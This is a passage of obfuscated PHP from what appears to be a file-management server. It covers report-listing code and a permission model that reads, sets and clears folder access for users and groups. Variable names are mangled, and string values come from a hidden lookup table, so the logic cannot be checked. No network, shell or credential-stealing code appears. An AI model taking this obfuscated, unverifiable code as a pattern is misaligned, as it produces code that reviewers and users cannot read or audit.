(Model($‘¶ê˜åÈ[2160])->where($àƒá¡ñ×)->find()) { return !1; } $ãĞ¯Úü® = array($‘¶ê˜åÈ[670] => $ğç‰Õ‘ª[$‘¶ê˜åÈ[670]], $‘¶ê˜åÈ[1671] => $ğç‰Õ‘ª[$‘¶ê˜åÈ[1671]], $‘¶ê˜åÈ[193] => $ğç‰Õ‘ª[$‘¶ê˜åÈ[193]], $‘¶ê˜åÈ[543] => $ğç‰Õ‘ª[$‘¶ê˜åÈ[543]], $‘¶ê˜åÈ[1785] => USER_ID, $‘¶ê˜åÈ[33] => $ğç‰Õ‘ª[$‘¶ê˜åÈ[33]], $‘¶ê˜åÈ[528] => $ğç‰Õ‘ª[$‘¶ê˜åÈ[528]]); return Model($‘¶ê˜åÈ[2160])->add($ãĞ¯Úü®); } public function reportList($…š×¹åà) { $øñò¾¾ =& $_SERVER[¡¬ıÜ ƒ]; $Î‡ç°Î¼ = array(); if ($…š×¹åà[$øñò¾¾[840]]) { $†Ù™¬ò = $…š×¹åà[$øñò¾¾[841]] ? $…š×¹åà[$øñò¾¾[841]] : strtotime(date($øñò¾¾[2162])); $Î‡ç°Î¼[$øñò¾¾[233]] = array($øñò¾¾[410], array($…š×¹åà[$øñò¾¾[840]], $†Ù™¬ò)); } if (isset($…š×¹åà[$øñò¾¾[33]]) && in_array($…š×¹åà[$øñò¾¾[33]], array($øñò¾¾[91], $øñò¾¾[512], $øñò¾¾[2165], $øñò¾¾[2166], $øñò¾¾[2167]))) { $Î‡ç°Î¼[$øñò¾¾[33]] = $…š×¹åà[$øñò¾¾[33]]; } if (isset($…š×¹åà[$øñò¾¾[830]]) && in_array($…š×¹åà[$øñò¾¾[830]], array($øñò¾¾[230], $øñò¾¾[91], $øñò¾¾[512], $øñò¾¾[2165]))) { $Î‡ç°Î¼[$øñò¾¾[830]] = $…š×¹åà[$øñò¾¾[830]]; } $±®®›¾  = Input::get($øñò¾¾[533], $øñò¾¾[7], $øñò¾¾[2164], array($øñò¾¾[2081], $øñò¾¾[527])); $İÏƒÛÒı = array($øñò¾¾[525] => $øñò¾¾[526], $øñò¾¾[527] => $øñò¾¾[528]); $¬¢­âß± = $øñò¾¾[2168] . $İÏƒÛÒı[$±®®›¾ ]; $Ø¬©ïÃ = Model($øñò¾¾[2160])->where($Î‡ç°Î¼)->order($¬¢­âß±)->selectPage(20); if (empty($Ø¬©ïÃ[$øñò¾¾[447]])) { return array(); } $££ —Ö = array_to_keyvalue_group($Ø¬©ïÃ[$øñò¾¾[447]], $øñò¾¾[830], $øñò¾¾[670]); if (!empty($££ —Ö[0])) { $…š×¹åà = $££ —Ö[0]; $Î‡ç°Î¼ = array($øñò¾¾[670] => array($øñò¾¾[7], $…š×¹åà)); $°‚¦×ú¦ = $this->where($Î‡ç°Î¼)->field($øñò¾¾[670])->select(); $°‚¦×ú¦ = array_to_keyvalue($°‚¦×ú¦, $øñò¾¾[12], $øñò¾¾[670]); $©èûÑ‰¿ = array_diff($…š×¹åà, $°‚¦×ú¦); if (!empty($©èûÑ‰¿)) { foreach ($Ø¬©ïÃ[$øñò¾¾[447]] as $Ã”ôû€ => $í‚³ÊÅÚ) { if (in_array($í‚³ÊÅÚ[$øñò¾¾[670]], $©èûÑ‰¿)) { unset($Ø¬©ïÃ[$øñò¾¾[447]][$Ã”ôû€]); } } } } $this->_listDataApply($Ø¬©ïÃ[$øñò¾¾[447]]); return $Ø¬©ïÃ; } public function reportStatus($Í‹É»ø) { $ ó×ğÜ =& $_SERVER[¡¬ıÜ ƒ]; $¿‘åÅ–ü = array($ ó×ğÜ[477] => $Í‹É»ø[$ ó×ğÜ[477]]); $£»”·‹ = Model($ ó×ğÜ[2160])->where($¿‘åÅ–ü)->field($ ó×ğÜ[2169])->find(); if (!$£»”·‹) { return !1; } $¼ËÄ´ÕŸ = array($ ó×ğÜ[830] => $Í‹É»ø[$ ó×ğÜ[830]]); if ($Í‹É»ø[$ ó×ğÜ[830]] == $ ó×ğÜ[2165] && $£»”·‹[$ ó×ğÜ[830]] == $ ó×ğÜ[2165]) { $¼ËÄ´ÕŸ[$ ó×ğÜ[830]] = 0; } $ŸüîëÕã = Model($ ó×ğÜ[2160])->where($¿‘åÅ–ü)->save($¼ËÄ´ÕŸ); if ($Í‹É»ø[$ ó×ğÜ[830]] == $ ó×ğÜ[512]) { if ($£»”·‹[$ ó×ğÜ[543]] != $ ó×ğÜ[230] && $this->shareFileMeta($£»”·‹[$ ó×ğÜ[543]])) { $this->shareFileMeta($£»”·‹[$ ó×ğÜ[543]], 0); } $this->remove($£»”·‹[$ ó×ğÜ[670]]); return !0; } if ($ŸüîëÕã && $Í‹É»ø[$ ó×ğÜ[830]] == $ ó×ğÜ[2165]) { $ú¹É¯ = $¼ËÄ´ÕŸ[$ ó×ğÜ[830]] == $ ó×ğÜ[2165] ? 1 : 0; $this->shareFileMeta($£»”·‹[$ ó×ğÜ[543]], $ú¹É¯); $this->removeByFile($£»”·‹[$ ó×ğÜ[543]]); } return $ŸüîëÕã; } private function removeByFile($•ğÃŞú) { $ò°ßíÓ =& $_SERVER[¡¬ıÜ ƒ]; $ÈôóıÕï = Model($ò°ßíÓ[914])->where(array($ò°ßíÓ[543] => $•ğÃŞú))->field($ò°ßíÓ[193])->select(); $óíô°‰õ = array_to_keyvalue($ÈôóıÕï, $ò°ßíÓ[12], $ò°ßíÓ[193]); $àïôéù = array($ò°ßíÓ[193] => array($ò°ßíÓ[7], $óíô°‰õ), $ò°ßíÓ[564] => 1); $ÈôóıÕï = $this->where($àïôéù)->field($ò°ßíÓ[670])->select(); if (empty($ÈôóıÕï)) { return; } $üñ§å®³ = array_to_keyvalue($ÈôóıÕï, $ò°ßíÓ[12], $ò°ßíÓ[670]); $this->remove($üñ§å®³); } private function shareFileMeta($ÈÉ²ö±º, $Ú‹¬ƒ€ = null) { $«¼™ÎºŠ =& $_SERVER[¡¬ıÜ ƒ]; $Ûàü€¦’ = array($«¼™ÎºŠ[543] => $ÈÉ²ö±º, $«¼™ÎºŠ[97] => $«¼™ÎºŠ[2170]); if (is_null($Ú‹¬ƒ€)) { return Model($«¼™ÎºŠ[2171])->where($Ûàü€¦’)->find(); } $Ûàü€¦’[$«¼™ÎºŠ[452]] = $Ú‹¬ƒ€; Model($«¼™ÎºŠ[2171])->add($Ûàü€¦’, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\x63\145\137\x61\x75\x74\150"; public function getAuth($Åí¡†ëß) { $—Óœ·ıú =& $_SERVER[¡¬ıÜ ƒ]; $×¾ñòü = $this->sourceAuthSelect($Åí¡†ëß); $îõ…ç®³ = array(); $î’ÁÓøñ = array(); $ğÅ¢Šƒâ = 2 << 25; foreach ($×¾ñòü as $ÉˆÅÜˆ) { $·ÈÕåÍ‘ = Model($—Óœ·ıú[573])->listData($ÉˆÅÜˆ[$—Óœ·ıú[2094]]); if (!$·ÈÕåÍ‘) { continue; } $îõ…ç®³[] = $ÉˆÅÜˆ; $Ñ¾û‘€î = 0; if ($ÉˆÅÜˆ[$—Óœ·ıú[190]] == SourceModel::TYPE_GROUP) { $Ñ¾û‘€î = $ğÅ¢Šƒâ * 2; } if ($ÉˆÅÜˆ[$—Óœ·ıú[190]] == SourceModel::TYPE_USER) { $Ñ¾û‘€î = $ğÅ¢Šƒâ; } if ($ÉˆÅÜˆ[$—Óœ·ıú[190]] == SourceModel::TYPE_USER && $ÉˆÅÜˆ[$—Óœ·ıú[571]] == $—Óœ·ıú[230]) { $Ñ¾û‘€î = 0; } $î’ÁÓøñ[] = $·ÈÕåÍ‘[$—Óœ·ıú[489]] + $Ñ¾û‘€î; } array_multisort($î’ÁÓøñ, SORT_DESC, $îõ…ç®³); return $îõ…ç®³; } public function sourceAuthSelect($ßàÎÚµÍ) { $­²‚âóÑ =& $_SERVER[¡¬ıÜ ƒ]; static $½¨Òã­… = array(); $çä¿Ì©´ = is_array($ßàÎÚµÍ) ? !1 : !0; if ($çä¿Ì©´) { $ßàÎÚµÍ = array($ßàÎÚµÍ); } $ÀÑ©È° = array(); foreach ($ßàÎÚµÍ as $ÒÙ†) { if (isset($½¨Òã­…[$ÒÙ†])) { $ÀÑ©È°[$ÒÙ†] = $½¨Òã­…[$ÒÙ†]; } } if (count($ÀÑ©È°) == count($ßàÎÚµÍ)) { return $çä¿Ì©´ ? $ÀÑ©È°[$ßàÎÚµÍ[0]] : $ÀÑ©È°; } $ıºÔ¼šâ = $­²‚âóÑ[2172]; $Œ«²È¹‚ = array($­²‚âóÑ[193] => array($­²‚âóÑ[7], $ßàÎÚµÍ)); $í‚Ü¯ßÉ = $this->field($ıºÔ¼šâ)->order($­²‚âóÑ[477])->where($Œ«²È¹‚)->select(); $¸…„ÚÅ» = array_to_keyvalue_group($í‚Ü¯ßÉ, $­²‚âóÑ[193]); foreach ($ßàÎÚµÍ as $ÒÙ†) { $½¨Òã­…[$ÒÙ†] = $¸…„ÚÅ»[$ÒÙ†] ? $¸…„ÚÅ»[$ÒÙ†] : array(); } if ($çä¿Ì©´) { return $í‚Ü¯ßÉ; } return $¸…„ÚÅ»; } public function setAuth($Œœ¨ÔÆ, $ëˆŠøˆÒ) { $Š¬È¾Ê =& $_SERVER[¡¬ıÜ ƒ]; $í¸èµ³Å = Model($Š¬È¾Ê[1432])->sourceInfo($Œœ¨ÔÆ); if (!$í¸èµ³Å) { return !1; } if ($í¸èµ³Å[$Š¬È¾Ê[190]] != SourceModel::TYPE_GROUP) { return !1; } $æ¨™ê“³ = 1; $²ïíç¨À = $í¸èµ³Å[$Š¬È¾Ê[571]]; if ($²ïíç¨À != $æ¨™ê“³) { $Ô×İŸ‡ = array($Š¬È¾Ê[1986] => $²ïíç¨À); $È‚‡ÍÕ„ = Model($Š¬È¾Ê[2080])->field($Š¬È¾Ê[1785])->where($Ô×İŸ‡)->select(); $È‚‡ÍÕ„ = array_to_keyvalue($È‚‡ÍÕ„, $Š¬È¾Ê[12], $Š¬È¾Ê[1785]); } $—·ßûğĞ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $õÖÖÑÈã = array(); foreach ($ëˆŠøˆÒ as $Â‹ˆğÏ) { if (!in_array($Â‹ˆğÏ[$Š¬È¾Ê[190]], $—·ßûğĞ)) { show_json(LNG($Š¬È¾Ê[2173]), !1); } if ($²ïíç¨À != $æ¨™ê“³) { if ($Â‹ˆğÏ[$Š¬È¾Ê[190]] == SourceModel::TYPE_GROUP) { } if ($Â‹ˆğÏ[$Š¬È¾Ê[571]] != 0 && !in_array($Â‹ˆğÏ[$Š¬È¾Ê[571]], $È‚‡ÍÕ„)) { } } if ($Â‹ˆğÏ[$Š¬È¾Ê[571]] == 0) { $Â‹ˆğÏ[$Š¬È¾Ê[190]] = SourceModel::TYPE_USER; } $õÖÖÑÈã[] = array($Š¬È¾Ê[193] => $Œœ¨ÔÆ, $Š¬È¾Ê[190] => intval($Â‹ˆğÏ[$Š¬È¾Ê[190]]), $Š¬È¾Ê[571] => intval($Â‹ˆğÏ[$Š¬È¾Ê[571]]), $Š¬È¾Ê[2094] => intval($Â‹ˆğÏ[$Š¬È¾Ê[2094]]) ? intval($Â‹ˆğÏ[$Š¬È¾Ê[2094]]) : 0, $Š¬È¾Ê[2155] => intval($Â‹ˆğÏ[$Š¬È¾Ê[2155]]) ? intval($Â‹ˆğÏ[$Š¬È¾Ê[2155]]) : -1); } $this->where(array($Š¬È¾Ê[493] => $Œœ¨ÔÆ))->delete(); $this->addAll($õÖÖÑÈã); return !0; } public function authClear($Ãç°–ª±) { $š“µË’ =& $_SERVER[¡¬ıÜ ƒ]; $Ö‰ôàî¹ = Model($š“µË’[1432])->sourceInfo($Ãç°–ª±); $©Šõ±²¦ = array($Ãç°–ª±); if ($Ö‰ôàî¹[$š“µË’[487]] == $š“µË’[91]) { $÷¦˜Úš¸ = array($š“µË’[657] => array($š“µË’[617], $Ö‰ôàî¹[$š“µË’[586]] . $Ãç°–ª± . $š“µË’[618])); $©Šõ±²¦ = Model($š“µË’[1432])->field($š“µË’[493])->where($÷¦˜Úš¸)->getField($š“µË’[193], !0); $©Šõ±²¦[] = $Ãç°–ª±; } $this->where(array($š“µË’[493] => array($š“µË’[494], $©Šõ±²¦)))->delete(); return !0; } public function getAllChildren($Ó‹Íù¿„) { $ËĞ¶Û¦Í =& $_SERVER[¡¬ıÜ ƒ]; $Û¥§›©ƒ = Model($ËĞ¶Û¦Í[1432])->sourceInfo($Ó‹Íù¿„); if ($Û¥§›©ƒ[$ËĞ¶Û¦Í[487]] != $ËĞ¶Û¦Í[91]) { return $this->sourceListAuth(array($Ó‹Íù¿„)); } if ($Û¥§›©ƒ[$ËĞ¶Û¦Í[190]] != SourceModel::TYPE_GROUP) { return array(); } $¡ü¢ù… = 1; $ØÛñÚó = array($Ó‹Íù¿„); if ($Û¥§›©ƒ[$ËĞ¶Û¦Í[192]] == $ËĞ¶Û¦Í[230] && $Û¥§›©ƒ[$ËĞ¶Û¦Í[571]] != $¡ü¢ù…) { $ØÛñÚó = $this->groupChidldAllRootSource($Û¥§›©ƒ[$ËĞ¶Û¦Í[571]]); } $€Æ½¹ Ø = $this->field($ËĞ¶Û¦Í[193])->group($ËĞ¶Û¦Í[193])->select(); $€Æ½¹ Ø = array_to_keyvalue($€Æ½¹ Ø, $ËĞ¶Û¦Í[12], $ËĞ¶Û¦Í[193]); if (!$€Æ½¹ Ø) { return array(); } $ô¶Àµß = $ËĞ¶Û¦Í[2174]; $ŸÂ‡åÙ„ = array($ËĞ¶Û¦Í[193] => array($ËĞ¶Û¦Í[7], $€Æ½¹ Ø), $ËĞ¶Û¦Í[507] => $ËĞ¶Û¦Í[230]); $ˆ§—› = Model($ËĞ¶Û¦Í[914])->field($ô¶Àµß)->where($ŸÂ‡åÙ„)->select(); $ğæùñÕæ = array($Ó‹Íù¿„); foreach ($ˆ§—› as $ºß¶×À„) { foreach ($ØÛñÚó as $±¤¥äåî) { $Ş©éï®¸ = $ËĞ¶Û¦Í[50] . $±¤¥äåî . $ËĞ¶Û¦Í[50]; $£˜Éùìâ = $ºß¶×À„[$ËĞ¶Û¦Í[586]] . $ºß¶×À„[$ËĞ¶Û¦Í[193]] . $ËĞ¶Û¦Í[50]; if (strstr($£˜Éùìâ, $Ş©éï®¸)) { $ğæùñÕæ[] = $ºß¶×À„[$ËĞ¶Û¦Í[193]]; break; } } } return $this->sourceListAuth($ğæùñÕæ); } private function sourceListAuth($©¹õÚ»ü) { $—®¸‡¢Ô =& $_SERVER[¡¬ıÜ ƒ]; $…ˆ¶×Ëù = Model($—®¸‡¢Ô[1432])->sourceListInfo($©¹õÚ»ü, !0); $–éáÂØó = $this->sourceAuthSelect($©¹õÚ»ü); $‘¤ø‡„ = array(); $èœ¼³ß— = array(); foreach ($…ˆ¶×Ëù as $×ƒ†¢®Ù) { unset($×ƒ†¢®Ù[$—®¸‡¢Ô[531]]); unset($×ƒ†¢®Ù[$—®¸‡¢Ô[529]]); unset($×ƒ†¢®Ù[$—®¸‡¢Ô[489]]); unset($×ƒ†¢®Ù[$—®¸‡¢Ô[90]]); $Ü³îğšç = $–éáÂØó[$×ƒ†¢®Ù[$—®¸‡¢Ô[193]]]; if (!$Ü³îğšç) { continue; } $×ƒ†¢®Ù[$—®¸‡¢Ô[2175]] = $this->authTargetInfo($Ü³îğšç); $×ƒ†¢®Ù[$—®¸‡¢Ô[584]] = rtrim($×ƒ†¢®Ù[$—®¸‡¢Ô[590]], $—®¸‡¢Ô[8]) . $—®¸‡¢Ô[8] . ltrim($×ƒ†¢®Ù[$—®¸‡¢Ô[584]], $—®¸‡¢Ô[8]); $‘¤ø‡„[] = $×ƒ†¢®Ù; $ŞÆ‡ğñÀ = count(explode($—®¸‡¢Ô[8], trim($×ƒ†¢®Ù[$—®¸‡¢Ô[584]], $—®¸‡¢Ô[8]))); $èœ¼³ß—[] = $ŞÆ‡ğñÀ + ($×ƒ†¢®Ù[$—®¸‡¢Ô[33]] == $—®¸‡¢Ô[78] ? 0 : 1000); } array_multisort($èœ¼³ß—, SORT_ASC, $‘¤ø‡„); return $‘¤ø‡„; } private function groupChidldAllRootSource($–Ëßúèˆ) { $èÅÊÓ¼í =& $_SERVER[¡¬ıÜ ƒ]; $—µí Ù¿ = Model($èÅÊÓ¼í[2176])->groupChildrenAll($–Ëßúèˆ); $ã²Ççû¯ = array($èÅÊÓ¼í[192] => 0, $èÅÊÓ¼í[571] => array($èÅÊÓ¼í[7], $—µí Ù¿), $èÅÊÓ¼í[190] => SourceModel::TYPE_GROUP); $î¼º³§ = Model($èÅÊÓ¼í[914])->field($èÅÊÓ¼í[193])->where($ã²Ççû¯)->select(); $î¼º³§ = array_to_keyvalue($î¼º³§, $èÅÊÓ¼í[12], $èÅÊÓ¼í[193]); return $î¼º³§; } private function authTargetInfo($ğ€õ‡ïÏ) { $Î™†Áœ‘ =& $_SERVER[¡¬ıÜ ƒ]; $”ù…ôÂ = array(); $Ë‡ÊÊ¼… = array(); $È¥Íµ‘” = 2 << 25; foreach ($ğ€õ‡ïÏ as $”ÇÀ™á¦) { $¼®–íéß = Model($Î™†Áœ‘[573])->listData($”ÇÀ™á¦[$Î™†Áœ‘[2094]]); if (!$¼®–íéß) { continue; } if ($”ÇÀ™á¦[$Î™†Áœ‘[190]] == SourceModel::TYPE_USER) { $™â¶ıƒ± = Model($Î™†Áœ‘[579])->getInfoSimpleOuter($”ÇÀ™á¦[$Î™†Áœ‘[571]]); if ($™â¶ıƒ±[$Î™†Áœ‘[1785]] == $Î™†Áœ‘[1284]) { continue; } if ($™â¶ıƒ±[$Î™†Áœ‘[1785]] == $Î™†Áœ‘[230]) { $™â¶ıƒ±[$Î™†Áœ‘[32]] = LNG($Î™†Áœ‘[2177]); } } else { $™â¶ıƒ± = Model($Î™†Áœ‘[587])->getInfoSimple($”ÇÀ™á¦[$Î™†Áœ‘[571]]); } if (!$™â¶ıƒ±) { continue; } $™â¶ıƒ±[$Î™†Áœ‘[542]] = $¼®–íéß; $”ù…ôÂ[] = $™â¶ıƒ±; $áş÷øŞ = 0; if ($”ÇÀ™á¦[$Î™†Áœ‘[190]] == SourceModel::TYPE_GROUP) { $áş÷øŞ = $È¥Íµ‘” * 2; } if ($”ÇÀ™á¦[$Î™†Áœ‘[190]] == SourceModel::TYPE_USER) { $áş÷øŞ = $È¥Íµ‘”; } if ($”ÇÀ™á¦[$Î™†Áœ‘[190]] == SourceModel::TYPE_USER && $”ÇÀ™á¦[$Î™†Áœ‘[571]] == $Î™†Áœ‘[230]) { $áş÷øŞ = 0; } $Ë‡ÊÊ¼…[] = $¼®–íéß[$Î™†Áœ‘[489]] + $áş÷øŞ; } array_multisort($Ë‡ÊÊ¼…, SORT_DESC, $”ù…ôÂ); return $”ù…ôÂ; } public function getAllChildrenByUser($Òï™‡ï°, $õãğ……) { $€ÖóÃˆ“ =& $_SERVER[¡¬ıÜ ƒ]; $ŞÂ¼ˆ¡£ = Model($€ÖóÃˆ“[599])->getInfo($õãğ……); if (!$õãğ…… || !$Òï™‡ï° || !$ŞÂ¼ˆ¡£) { return array(); } $ºÒ›»ì = Model($€ÖóÃˆ“[1432])->sourceInfo($Òï™‡ï°); $ãŠñ¥™ğ = array(); $¿–ù“½í = 1; if ($ºÒ›»ì[$€ÖóÃˆ“[192]] == $€ÖóÃˆ“[230] && $ºÒ›»ì[$€ÖóÃˆ“[571]] != $¿–ù“½í && $this->groupContainUser($ºÒ›»ì[$€ÖóÃˆ“[571]], $õãğ……)) { foreach ($ŞÂ¼ˆ¡£[$€ÖóÃˆ“[2178]] as $˜¾÷®ğ®) { $§šéÓ•« = Model($€ÖóÃˆ“[587])->getInfo($˜¾÷®ğ®[$€ÖóÃˆ“[1986]]); $Ä²ƒàæı = Model($€ÖóÃˆ“[599])->getInfoSimpleOuter($õãğ……); $Ä²ƒàæı[$€ÖóÃˆ“[542]] = $˜¾÷®ğ®[$€ÖóÃˆ“[489]]; if (Model($€ÖóÃˆ“[573])->authCheckAction($˜¾÷®ğ®[$€ÖóÃˆ“[489]][$€ÖóÃˆ“[489]], $€ÖóÃˆ“[2007])) { continue; } $Ñü”©ñ· = array($€ÖóÃˆ“[32] => $€ÖóÃˆ“[1304] . $§šéÓ•«[$€ÖóÃˆ“[32]], $€ÖóÃˆ“[193] => $§šéÓ•«[$€ÖóÃˆ“[90]][$€ÖóÃˆ“[193]], $€ÖóÃˆ“[87] => KodIO::make($§šéÓ•«[$€ÖóÃˆ“[90]][$€ÖóÃˆ“[193]]), $€ÖóÃˆ“[192] => $€ÖóÃˆ“[230], $€ÖóÃˆ“[190] => $€ÖóÃˆ“[580], $€ÖóÃˆ“[33] => $€ÖóÃˆ“[621], $€ÖóÃˆ“[584] => $§šéÓ•«[$€ÖóÃˆ“[591]], $€ÖóÃˆ“[1986] => $§šéÓ•«[$€ÖóÃˆ“[1986]], $€ÖóÃˆ“[588] => $§šéÓ•«[$€ÖóÃˆ“[192]], $€ÖóÃˆ“[2175] => array($Ä²ƒàæı)); $ãŠñ¥™ğ[$Ñü”©ñ·[$€ÖóÃˆ“[193]]] = $Ñü”©ñ·; } } $¨ ®½ñ« = array(); $Şîë¾äü = $this->getAllChildren($Òï™‡ï°); foreach ($Şîë¾äü as $Â°¢ÓÎå) { $Ì–ÊÖˆ = !1; foreach ($Â°¢ÓÎå[$€ÖóÃˆ“[2175]] as $ğáŒË¯ğ) { if ($ğáŒË¯ğ[$€ÖóÃˆ“[1785]]) { if ($ğáŒË¯ğ[$€ÖóÃˆ“[1785]] == $õãğ……) { $Ì–ÊÖˆ = !0; break; } } if ($ğáŒË¯ğ[$€ÖóÃˆ“[1986]]) { if ($this->groupContainUser($ğáŒË¯ğ[$€ÖóÃˆ“[1986]], $õãğ……)) { $Ì–ÊÖˆ = !0; break; } } } if ($Ì–ÊÖˆ) { $¨ ®½ñ«[] = $Â°¢ÓÎå; } $Ğ¬·ûˆó = $Â°¢ÓÎå[$€ÖóÃˆ“[193]]; if (isset($ãŠñ¥™ğ[$Ğ¬·ûˆó])) { $Â°¢ÓÎå[$€ÖóÃˆ“[2175]][] = $ãŠñ¥™ğ[$Ğ¬·ûˆó][0]; $ãŠñ¥™ğ[$Ğ¬·ûˆó] = !1; } } $ãŠñ¥™ğ = array_filter(array_values($ãŠñ¥™ğ)); $¨ ®½ñ« = array_merge($ãŠñ¥™ğ, $¨ ®½ñ«); return $¨ ®½ñ«; } public function setAllChildrenByUser($¢ô³¦»Ÿ, $ˆ‡ú°òğ, $ƒÙÌÆ) { $æß§¤Ìº =& $_SERVER[¡¬ıÜ ƒ]; $ê¬ÆÍÀã = $this->getAllChildrenByUser($¢ô³¦»Ÿ, $ˆ‡ú°òğ); if (!$ƒÙÌÆ || !$ê¬ÆÍÀã) { return !1; } foreach ($ê¬ÆÍÀã as $øø—í¼ã) { $÷Öµ€¥Í = array(); foreach ($øø—í¼ã[$æß§¤Ìº[2175]] as $Ä÷ÖĞ“Õ) { $ˆõŸÄÂ = $Ä÷ÖĞ“Õ[$æß§¤Ìº[542]]; $¾™™Å¸£ = $Ä÷ÖĞ“Õ[$æß§¤Ìº[1785]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $†â÷×«Š = $Ä÷ÖĞ“Õ[$æß§¤Ìº[1785]] ? $Ä÷ÖĞ“Õ[$æß§¤Ìº[1785]] : $Ä÷ÖĞ“Õ[$æß§¤Ìº[1986]]; if ($Ä÷ÖĞ“Õ[$æß§¤Ìº[1785]] && $Ä÷ÖĞ“Õ[$æß§¤Ìº[1785]] == $ˆ‡ú°òğ) { continue; } $÷Öµ€¥Í[] = array($æß§¤Ìº[193] => $øø—í¼ã[$æß§¤Ìº[193]], $æß§¤Ìº[190] => $¾™™Å¸£, $æß§¤Ìº[571] => intval($†â÷×«Š), $æß§¤Ìº[2094] => isset($ˆõŸÄÂ[$æß§¤Ìº[477]]) ? intval($ˆõŸÄÂ[$æß§¤Ìº[477]]) : 0, $æß§¤Ìº[2155] => isset($ˆõŸÄÂ[$æß§¤Ìº[2155]]) ? intval($ˆõŸÄÂ[$æß§¤Ìº[2155]]) : -1); } $÷Öµ€¥Í[] = array($æß§¤Ìº[193] => $øø—í¼ã[$æß§¤Ìº[193]], $æß§¤Ìº[190] => SourceModel::TYPE_USER, $æß§¤Ìº[571] => intval($ˆ‡ú°òğ), $æß§¤Ìº[2094] => intval($ƒÙÌÆ), $æß§¤Ìº[2155] => -1); $this->where(array($æß§¤Ìº[493] => $øø—í¼ã[$æß§¤Ìº[193]]))->delete(); $this->addAll($÷Öµ€¥Í); } return !0; } public function get($ö¢õ¥ƒå) { $…×èíş = $this->getSourceList(array($ö¢õ¥ƒå), !0); return $…×èíş[0]; } public function getSourceList($ …Ô½¼, $ÍûïÆË® = false, $ç¹Š¶Ú = false) { $¢Ñëä²† =& $_SERVER[¡¬ıÜ ƒ]; if (!$ …Ô½¼) { return array(); } $µ·ÀÇÍà = Model($¢Ñëä²†[1432]); if (!$ÍûïÆË® && count($ …Ô½¼) == 1) { $ÍûïÆË® = array(); $ÍûïÆË®[$ …Ô½¼[0]] = $µ·ÀÇÍà->sourceInfo($ …Ô½¼[0]); } if (!$ÍûïÆË®) { $–¡­ºíº = array($¢Ñëä²†[493] => array($¢Ñëä²†[494], $ …Ô½¼)); $ÍûïÆË® = $µ·ÀÇÍà->field($¢Ñëä²†[2179])->where($–¡­ºíº)->select(); $ÍûïÆË® = array_to_keyvalue($ÍûïÆË®, $¢Ñëä²†[193]); } $ı„§´˜ = $ …Ô½¼; foreach ($ÍûïÆË® as $¿¨¹ŞÕ => $Îİ®«¾¶) { $ê©Óè„ù = $µ·ÀÇÍà->parentLevelArray($Îİ®«¾¶[$¢Ñëä²†[586]]); $ı„§´˜ = array_merge($ı„§´˜, array($¿¨¹ŞÕ), array_reverse($ê©Óè„ù)); } $ı„§´˜ = array_values(array_unique($ı„§´˜)); if (!$ı„§´˜) { return array(); } $şÚÛ†÷è = $this->sourceAuthSelect($ı„§´˜); $†Í¼Ö¡Ö = array(); foreach ($ı„§´˜ as $è¢Ñ·ÃÀ) { if (isset($şÚÛ†÷è[$è¢Ñ·ÃÀ])) { $†Í¼Ö¡Ö[$è¢Ñ·ÃÀ] = $şÚÛ†÷è[$è¢Ñ·ÃÀ]; } } $ë—ıÂ„ô = $this->userIsRoot($ç¹Š¶Ú); $Æ›ÜâĞ‹ = AuthModel::authAll(); $ì‘»Í = array($¢Ñëä²†[490] => $Æ›ÜâĞ‹, $¢Ñëä²†[2180] => array($¢Ñëä²†[495] => 0, $¢Ñëä²†[1992] => $Æ›ÜâĞ‹, $¢Ñëä²†[496] => LNG($¢Ñëä²†[2181]), $¢Ñëä²†[2009] => $¢Ñëä²†[2182])); $ªÏ²–ˆö = array(); foreach ($ÍûïÆË® as $è¢Ñ·ÃÀ => $üöã¡ŒÁ) { if ($ë—ıÂ„ô && $GLOBALS[$¢Ñëä²†[6]][$¢Ñëä²†[2005]]) { $ªÏ²–ˆö[$è¢Ñ·ÃÀ] = $ì‘»Í; continue; } $ªÏ²–ˆö[$è¢Ñ·ÃÀ] = $this->makeSourceAuth($üöã¡ŒÁ, $†Í¼Ö¡Ö, $ç¹Š¶Ú); } return $ªÏ²–ˆö; } public function authDeepCheck($ÓÇ¥©Ù•, $©·Æ = false) { $°É›š¤ª =& $_SERVER[¡¬ıÜ ƒ]; $©·Æ = $©·Æ ? $©·Æ : USER_ID; $—ù˜Í“ = $this->makeAuthDeep($©·Æ); if (!in_array($ÓÇ¥©Ù•, $—ù˜Í“[$°É›š¤ª[2183]])) { return !1; } $óµÙŞ¦å = array(); foreach ($—ù˜Í“[$°É›š¤ª[2184]] as $·àæÇ†É => $¾Ü™úÁ) { if (!in_array($ÓÇ¥©Ù•, $¾Ü™úÁ)) { continue; } $óµÙŞ¦å[] = $·àæÇ†É; } if (!$óµÙŞ¦å) { return !1; } $ŠÖŸÄĞâ = $óµÙŞ¦å ? $óµÙŞ¦å[0] : $ÓÇ¥©Ù•; return array($°É›š¤ª[490] => -1, $°É›š¤ª[542] => array($°É›š¤ª[495] => $°É›š¤ª[1284], $°É›š¤ª[1992] => $°É›š¤ª[230], $°É›š¤ª[496] => LNG($°É›š¤ª[2185]), $°É›š¤ª[2009] => $°É›š¤ª[2186]), $°É›š¤ª[2187] => LNG($°É›š¤ª[2188]), $°É›š¤ª[2189] => $this->sourceAuthInfo($ŠÖŸÄĞâ)); } protected function makeAuthDeep($İßœ = false) { $Ã­æìˆş =& $_SERVER[¡¬ıÜ ƒ]; static $œ¢¹ô¿Ì = array(); $İßœ = $İßœ ? $İßœ : USER_ID; if (isset($œ¢¹ô¿Ì[$İßœ])) { return $œ¢¹ô¿Ì[$İßœ]; } $ŞÇÊì¡ = Model($Ã­æìˆş[2190])->listData(); $Å¥½Üı™ = array(); foreach ($ŞÇÊì¡ as $öÀº ÙŞ) { if ($öÀº ÙŞ[$Ã­æìˆş[489]] == 0 && $öÀº ÙŞ[$Ã­æìˆş[2008]] == $Ã­æìˆş[91]) { $Å¥½Üı™[] = $öÀº ÙŞ[$Ã­æìˆş[477]]; } } $â©ıô¦è = $this->userGroupParents($İßœ); $öàÛ¥‡‡ = array($Ã­æìˆş[190] => SourceModel::TYPE_USER, $Ã­æìˆş[571] => $İßœ); if ($â©ıô¦è) { $öàÛ¥‡‡ = array(array($Ã­æìˆş[190] => SourceModel::TYPE_USER, $Ã­æìˆş[571] => $İßœ), array($Ã­æìˆş[190] => SourceModel::TYPE_GROUP, $Ã­æìˆş[571] => array($Ã­æìˆş[494], $â©ıô¦è)), $Ã­æìˆş[1088] => 